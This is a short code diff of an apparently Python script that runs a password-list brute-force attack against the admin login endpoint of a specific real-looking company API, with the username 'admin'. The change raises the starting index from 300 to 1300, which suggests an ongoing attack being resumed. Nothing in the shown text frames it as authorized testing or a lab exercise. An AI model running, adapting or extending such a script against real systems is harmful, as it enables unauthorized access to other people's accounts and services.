@@ -46,5 +46,5 @@ def brute_force_target(url='', username='admin', from_idx=0):
 if __name__ == '__main__':
     # brute force target with password list
     url = 'https://api.longthanhplastic.com.vn/v1/admin/auth/login'
-    from_idx = 300
+    from_idx = 1300
     brute_force_target(url, username='admin', from_idx=from_idx)
